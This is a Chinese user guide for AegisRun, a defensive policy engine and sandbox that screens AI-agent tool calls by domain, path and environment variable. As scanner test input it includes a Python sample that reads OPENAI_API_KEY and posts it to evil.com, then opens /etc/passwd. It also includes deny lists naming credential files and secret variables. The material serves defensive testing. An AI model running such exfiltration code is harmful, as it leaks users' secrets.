# AegisRun 使用指南

> 🇬🇧 [English version →](../docs-en/GUIDE.md)
> 双级合一：新手入门 — 3 分钟上手 + 排障 | 详情参考 — 库 API、CLI、WASI 沙箱、网页面板

---

## 新手入门

### 30 秒快速上手

```cmd
cd D:\moonbit\aegisrun
quickstart.cmd
```

按 `1` 看拦截效果，按 `3` 看 7 个安全场景，按 `0` 退出。

### 快速排障

1. **确认 MoonBit 安装正确** — `moon version` 应显示 `0.1.20260608` 或更高。重装：`irm https://cli.moonbitlang.com/install/powershell.ps1 | iex`
2. **确认在正确目录** — `cd D:\moonbit\aegisrun` 然后 `dir quickstart.cmd`
3. **清除编译缓存** — `rmdir /s /q target`

### 常见坑

| 现象 | 原因 | 解决 |
|------|------|------|
| `文件名、目录名或卷标语法不正确` | CMD 里用了 PS 语法 | CMD 用 `set X=v` |
| `'set' is not recognized` | PS 里用了 CMD 语法 | PS 用 `$env:X = "v"` |
| 输出和代码不一致 | build 缓存被污染 | `rmdir /s /q target` |
| `Package "lib" not found` | 文件没在 `src/` 下 | `src/` 下的包才能用 `@lib` |
| `abstract type` | struct 字段没有 `pub` | 跨包访问需要加 `pub` |
| 两个文件都有 `main` | 一个包只能有一个入口 | 删掉多余的 |

### 命令速查

| 命令 | 效果 |
|------|------|
| `quickstart.cmd` | 一键菜单 |
| `aegisrun.exe demo` | 策略引擎演示（14项） |
| `aegisrun.exe scan malware.py` | 扫描脚本找威胁 |
| `aegisrun.exe serve` | 网页管理面板 |
| `aegisrun.exe policy show` | 查看策略 |
| `moon run src/demo/intercept.mbt` | 12种攻击拦截演示 |

### 环境变量说明

| 变量 | 作用 | 示例 |
|------|------|------|
| `AEGISRUN_POLICY` | 从 Web 面板同步策略 | `set AEGISRUN_POLICY=domain_bl=evil.com\|path_bl=/etc/passwd` |
| `AEGISRUN_DEMO` | 选择单个 demo（1-7） | `set AEGISRUN_DEMO=2` |
| `AEGISRUN_ATTACKS` | 选择攻击类型（1-12） | `set AEGISRUN_ATTACKS=1,4,7,12` |

---

## 详情参考

### 使用场景

**AI Agent 开发者** — 检查第三方工具是否安全：
```moonbit
let domain_ok = @lib.check_domain(bl, suffixes, "evil.com")  // → Deny
```

**安全管理员** — 扫描可疑脚本：
```cmd
aegisrun.exe scan suspicious.py
```

**策略管理员** — 浏览器打开 `http://localhost:9090`：
```cmd
aegisrun.exe serve
```

### 整体架构

```
src/lib/*.mbt          ← MoonBit 库（策略引擎，给别人 moon add 用的）
runtime/src/lib.rs     ← Rust 库（策略引擎，给别人 cargo add 用的）
runtime/src/main.rs    ← CLI 工具（aegisrun.exe）
dashboard.html         ← 网页管理面板
```

**库是产品，CLI 和网页是遥控器。**

```
AI Agent (Claude/GPT)
    │  MCP 协议
    ▼
AegisRun 策略引擎
    │  check_domain / check_path / check_env
    ▼
Allow → 放行执行  /  Deny → 拦截拒绝
```

### 作为 MoonBit 库使用

**安装：** `moon add aegisrun`

```moonbit
fn main {
  let policy = @aegisrun.lib.new_policy_engine()
  let domain_bl = @lib.get_blacklist_domains(policy)
  let suffixes = @lib.get_domain_suffixes(policy)

  match @lib.check_domain(domain_bl, suffixes, "evil.com") {
    Allow => println("safe")
    Deny  => println("BLOCKED!")
  }

  match @lib.check_env(policy.sensitive_envs, "OPENAI_API_KEY") {
    Deny => println("BLOCKED!")
  }
}
```

**函数一览：**

| 函数 | 作用 | 返回 |
|------|------|:--:|
| `check_domain(bl, suffixes, domain)` | 域名在黑名单？ | Allow/Deny |
| `check_path(bl, prefixes, path)` | 路径在黑名单？ | Allow/Deny |
| `check_env(sensitive, varname)` | 环境变量敏感？ | Allow/Deny |
| `check_tool_id(bl, id)` | 工具被封杀？ | Allow/Deny |
| `new_policy_engine()` | 创建策略引擎 | PolicyState |
| `load_policy_patch(state, str)` | 从字符串加载策略 | void |

### 作为 Rust 库使用

**安装：** `cargo add aegisrun-runtime`

```rust
use aegisrun_runtime::{Policy, scan_script, sandbox_read_file};

fn main() {
    let policy = Policy::standard();

    if !policy.check_domain("evil.com") {
        println!("BLOCKED!");
    }

    let source = std::fs::read_to_string("malware.py").unwrap();
    let findings = scan_script(&source);

    match sandbox_read_file(&policy, "/etc/passwd") {
        Ok(data) => println!("Read {} bytes", data.len()),
        Err(e) => println!("BLOCKED: {}", e),
    }
}
```

**函数一览：**

| 函数 | 作用 | 返回 |
|------|------|------|
| `Policy::standard()` | 标准预设 | Policy |
| `Policy::strict()` | 严格预设 | Policy |
| `Policy::permissive()` | 宽松预设 | Policy |
| `.check_domain("evil.com")` | 域名检查 | bool |
| `.check_path("/etc/passwd")` | 路径检查 | bool |
| `.check_env("OPENAI_API_KEY")` | 环境变量检查 | bool |
| `scan_script(&source)` | 扫描源码找威胁 | Vec\<ScanFinding\> |
| `sandbox_read_file(&policy, path)` | 安全读文件 | Result\<String\> |

### CLI 工具

**编译：** `cd runtime && cargo build`

**全部命令：**
```cmd
aegisrun.exe demo                  # 策略引擎演示
aegisrun.exe scan malware.py       # 扫描脚本
aegisrun.exe sandbox tool.wasm     # WASI 沙箱
aegisrun.exe serve                 # 网页面板
aegisrun.exe policy show           # 查看策略
aegisrun.exe policy set strict     # 切换预设
aegisrun.exe policy block domain evil.com  # 封禁域名
```

### WASI 沙箱（真实物理隔离）

```cmd
cd runtime\tools\malware_tool
cargo build --target wasm32-wasip1 --release
cd ..\..
aegisrun.exe sandbox tools\malware_tool\target\wasm32-wasip1\release\malware-tool.wasm
```

工具无法访问任何文件或环境变量 — WASI 零目录预打开 + 过滤环境变量。这不是策略 Deny，是 WASI 层的物理隔离。

### Web 管理面板

```cmd
cd runtime
cargo run -- serve    # 然后打开 http://localhost:9090
```

管理面板分为三大区域，导航栏用分隔符明确区分：

**Web 管理区**（普通管理功能）：
- **仪表盘**：五层防御开关（运行时沙箱/域名黑名单/路径+环境变量/扫描器/Wasm 沙箱）、实时统计、预设模板切换
- **域名策略**：黑名单/白名单管理，支持后缀通配（`*.evil.com`）和 IP 前缀（`192.168.*`）
- **路径策略**：敏感路径拦截，支持精确匹配和前缀目录
- **环境变量**：敏感变量模式管理，内置 KEY/SECRET/TOKEN/PASSWORD/CREDENTIAL 关键词检测
- **工具管理**：工具 ID 即时封杀
- **审计日志**：实时操作记录，支持清空

**Sandbox 检测区**（安全检测功能）：
- **静态扫描**：分析源码中的恶意模式（环境变量窃取、数据外泄、shell 注入等），快速返回行号和违规类型
- **运行时沙箱**：通过 Python audit hook 实际执行脚本，拦截 `open()`/`os.environ`/`socket.connect`/`subprocess.Popen` 等操作，合并静态+运行时结果

**MCP Agent 区**（Agent 集成功能）：
- **MCP 端点配置**：显示 Claude Desktop / Codex 等客户端的 MCP 配置 JSON
- **可用工具列表**：自动加载 9 个 MCP 工具（policy.summary / check_domain / check_path / check_env / guard_tool_call / scan_code / scan_file / sandbox_python / sandbox_wasm）
- **交互式调用面板**：选择工具 → 填写 JSON 参数 → 点击"调用" → 查看实时结果

#### 中英文界面切换

右上角点击 **中文** / **EN** 按钮即可切换语言。所有界面元素（包括防御层名称、提示文本、按钮标签）都会实时更新。

#### 安全检测示例

在 Sandbox 页面粘贴以下代码并点击"运行"：

```python
import os
key = os.environ.get("OPENAI_API_KEY")
import requests
requests.post("https://evil.com/steal", data={"key": key})
open("/etc/passwd")
```

**静态扫描结果：** `Static: 3 | Runtime: 0 | Blocked: 3`

**运行时沙箱结果（切换模式后）：** `Static: 3 | Runtime: 1 | Blocked: 4`（额外检测到 `[runtime-env] OPENAI_API_KEY`）

#### MCP 交互式调用

在 MCP Agent 页面选择 `aegisrun.policy.check_domain`，参数 `{"domain": "evil.com"}`，点击"调用"，返回 `{"decision": "DENY"}`。

#### RESTful API

| 端点 | 方法 | 功能 |
|------|------|------|
| `/api/policy` | GET | 获取当前策略 |
| `/api/stats` | GET | 获取运行统计 |
| `/api/audit` | GET | 获取审计日志 |
| `/api/defense` | GET | 获取防御层状态 |
| `/api/scan` | POST | 静态代码扫描 |
| `/api/sandbox-run` | POST | 运行时沙箱检测 |
| `/api/toggle/{layer}` | POST | 切换防御层 |
| `/api/block/{type}/{value}` | POST | 添加黑名单 |
| `/api/unblock/{type}/{value}` | POST | 移除黑名单 |
| `/api/preset/{name}` | POST | 切换预设模板 |
| `/api/clear-audit` | POST | 清空审计日志 |
| `/mcp` | POST | MCP 协议端点 |
### MCP 集成

```json
{ "mcpServers": { "aegisrun": { "url": "http://localhost:9090/mcp" } } }
```

9 个工具：policy.summary / policy.check_domain / policy.check_path / policy.check_env / guard_tool_call / scan_code / scan_file / sandbox_python / sandbox_wasm

> **注意：** MCP 在 Rust 侧运行。MoonBit 编译为 Wasm，无 TCP 能力。
> 启动方式：`cd runtime && cargo run -- serve`

### 策略定制

| 方式 | 路径 | 适合场景 |
|------|------|----------|
| 编辑 YAML 预设 | `presets/standard.yaml` | 项目启动时确定策略 |
| 命令行 | `moon run src/main deny domain xxx` | 快速临时封禁 |
| Web 面板 | `cargo run -- serve` → 浏览器 | 非开发人员使用 |

```yaml
blacklist:
  network:
    domains:
      - "evil.com"
      - "phish.your-org.cn"
      - "192.168.*"
  env_vars:
    - "OPENAI_API_KEY"
    - "INTERNAL_MASTER_KEY"
```

### 文件结构

```
D:\moonbit\aegisrun\
├── src/lib/               MoonBit 库（9 个模块）
├── src/demo/              拦截演示
├── src/generator/         恶意脚本生成
├── runtime/               Rust 库 + CLI
│   ├── src/lib.rs         Rust 库
│   ├── src/main.rs        CLI 工具
│   ├── src/server.rs      面板 + MCP
│   ├── src/sandbox.rs     wasmtime 沙箱
│   └── src/persist.rs     审计 + 持久化
├── dashboard.html         网页管理面板
├── quickstart.cmd         一键菜单
├── README.md              项目说明
├── docs-ch/               中文文档
└── docs-en/               英文文档
```
